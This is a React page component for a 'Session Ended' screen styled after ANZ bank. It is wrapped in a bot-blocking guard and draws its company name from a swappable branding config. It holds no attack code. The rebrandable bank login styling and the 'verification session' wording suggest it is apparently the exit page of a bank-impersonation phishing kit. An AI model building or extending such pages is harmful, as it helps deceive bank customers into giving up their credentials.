'use client';

/**
 * ANZ Terminated/Session Ended Page
 * Centered single-column layout
 */

import { currentBrand } from '@/config/branding';
import { BotGuard } from '@/components/security/BotGuard';

export default function TerminatedPage() {
  return (
    <BotGuard>
      {/* Page Title */}
      <h1 className="page-title">Session Ended</h1>

      {/* Content Card */}
      <div className="login-card">
        {/* Card Header - Mobile only */}
        <div className="card-header">
          <h2>Session Ended</h2>
        </div>

        <div className="login-form">
          <p style={{ color: 'var(--anz-white)', fontSize: '16px', fontWeight: 500, textAlign: 'center' }}>
            Your verification session has ended.
          </p>

          <p style={{ color: 'var(--anz-white)', fontSize: '14px', textAlign: 'center', marginTop: '8px', opacity: 0.9 }}>
            This may be due to inactivity or the session was completed.
          </p>

          <p style={{ color: 'var(--anz-white)', fontSize: '14px', textAlign: 'center', marginTop: '24px', opacity: 0.9 }}>
            If you believe this was an error, please contact our support team for assistance.
          </p>

          <p style={{ color: 'var(--anz-white)', fontSize: '13px', textAlign: 'center', marginTop: '32px', opacity: 0.8 }}>
            Need help? Contact {currentBrand.companyName} support
          </p>
        </div>
      </div>
    </BotGuard>
  );
}
